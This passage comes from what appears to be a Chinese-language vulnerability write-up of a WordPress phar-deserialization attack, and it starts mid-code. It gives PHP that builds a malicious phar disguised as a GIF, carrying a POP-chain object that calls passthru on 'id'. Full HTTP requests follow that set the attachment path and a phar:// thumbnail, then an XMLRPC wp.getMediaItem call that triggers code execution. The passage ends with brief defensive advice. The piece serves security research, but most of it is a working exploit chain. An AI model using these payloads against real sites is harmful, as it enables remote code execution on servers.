            protected $handles;
            public function __construct() {
                $this->handles = new Requests_Utility_FilteredIterator(array('id'), 'passthru');
            }
        }
        @unlink("phar.phar");
        $phar = new Phar("phar.phar");
        $phar->startBuffering();
        $phar->setStub("GIF89a".""); //设置stub, 增加gif文件头，伪造文件类型
        $o = new WC_Log_Handler_File();
        $phar->setMetadata($o); //将自定义meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
将后缀名改为gif后，可以在后台上传，也可以通过xmlrpc接口上传，都需要author及以上的权限。记下上传后的 **文件名** 和
**post_ID** 。
接下来我们要找到一个参数可控的文件系统函数：
`wp-includes/post.php`
    function wp_get_attachment_thumb_file( $post_id = 0 ) {
        $post_id = (int) $post_id;
        if ( !$post = get_post( $post_id ) )
            return false;
        if ( !is_array( $imagedata = wp_get_attachment_metadata( $post->ID ) ) )
            return false;
        $file = get_attached_file( $post->ID );
        if ( !empty($imagedata['thumb']) && ($thumbfile = str_replace(basename($file), $imagedata['thumb'], $file)) && file_exists($thumbfile) ) {
            /**
             * Filters the attachment thumbnail file path.
             *
             * @since 2.1.0
             *
             * @param string $thumbfile File path to the attachment thumbnail.
             * @param int    $post_id   Attachment ID.
             */
            return apply_filters( 'wp_get_attachment_thumb_file', $thumbfile, $post->ID );
        }
        return false;
    }
该函数可以通过XMLRPC调用"wp.getMediaItem"这个方法来访问到，变量`$thumbfile`传入了`file_exists()`，正是我们需要的函数，现在我们需要回溯一下`$thumbfile`变量，看其是否可控。
根据`$thumbfile = str_replace(basename($file), $imagedata['thumb'],
$file)`，如果`basename($file)`与`$file`相同的话，那么`$thumbfile`的值就是`$imagedata['thumb']`的值。先来看`$file`是如何获取到的：
`wp-includes/post.php`
    function get_attached_file( $attachment_id, $unfiltered = false ) {
        $file = get_post_meta( $attachment_id, '_wp_attached_file', true );
        // If the file is relative, prepend upload dir.
        if ( $file && 0 !== strpos( $file, '/' ) && ! preg_match( '|^.:\\\|', $file ) && ( ( $uploads = wp_get_upload_dir() ) && false === $uploads['error'] ) ) {
            $file = $uploads['basedir'] . "/$file";
        }
        if ( $unfiltered ) {
            return $file;
        }
        /**
         * Filters the attached file based on the given ID.
         *
         * @since 2.1.0
         *
         * @param string $file          Path to attached file.
         * @param int    $attachment_id Attachment ID.
         */
        return apply_filters( 'get_attached_file', $file, $attachment_id );
    }
如果`$file`是类似于windows盘符的路径`Z:\Z`，正则匹配就会失败，`$file`就不会拼接其他东西，此时就可以保证`basename($file)`与`$file`相同。
可以通过发送如下数据包来调用设置`$file`的值：
    POST /wordpress/wp-admin/post.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 147
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://127.0.0.1/wordpress/wp-admin/post.php?post=10&action=edit
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7Cb16569744dd9059a1fafaad1c21cfdbf90fc67aed30e322c9f570b145c3ec516; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7C5c9f11cf65b9a38d65629b40421361a2ef77abe24743de30c984cf69a967e503; wp-settings-time-2=1534912264; XDEBUG_SESSION=PHPSTORM
    Connection: close
    _wpnonce=1da6c638f9&_wp_http_referer=%2Fwp-    admin%2Fpost.php%3Fpost%3D16%26action%3Dedit&action=editpost&post_type=attachment&post_ID=11&file=Z:\Z
同样可以通过发送如下数据包来设置`$imagedata['thumb']`的值：
    POST /wordpress/wp-admin/post.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 184
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://127.0.0.1/wordpress/wp-admin/post.php?post=10&action=edit
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7Cb16569744dd9059a1fafaad1c21cfdbf90fc67aed30e322c9f570b145c3ec516; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7C5c9f11cf65b9a38d65629b40421361a2ef77abe24743de30c984cf69a967e503; wp-settings-time-2=1534912264; XDEBUG_SESSION=PHPSTORM
    Connection: close
    _wpnonce=1da6c638f9&_wp_http_referer=%2Fwp-    admin%2Fpost.php%3Fpost%3D16%26action%3Dedit&action=editattachment&post_ID=11&thumb=phar://./wp-content/uploads/2018/08/phar-1.gif/blah.txt
`_wpnonce`可在修改页面中获取。
最后通过XMLRPC调用"wp.getMediaItem"这个方法来调用`wp_get_attachment_thumb_file()`函数来触发反序列化。xml调用数据包如下：
    POST /wordpress/xmlrpc.php HTTP/1.1
    Host: 127.0.0.1
    Content-Type: text/xml
    Cookie: XDEBUG_SESSION=PHPSTORM
    Content-Length: 529
    Connection: close
      wp.getMediaItem  
            1 
            author 
            you_password
            11 
### 0x04 防御
  1. 在文件系统函数的参数可控时，对参数进行严格的过滤。
  2. 严格检查上传文件的内容，而不是只检查文件头。
  3. 在条件允许的情况下禁用可执行系统命令、代码的危险函数。
### 0x05 参考链接
  1. 
  2. 
  3. 
  4. 
  5. 
* * *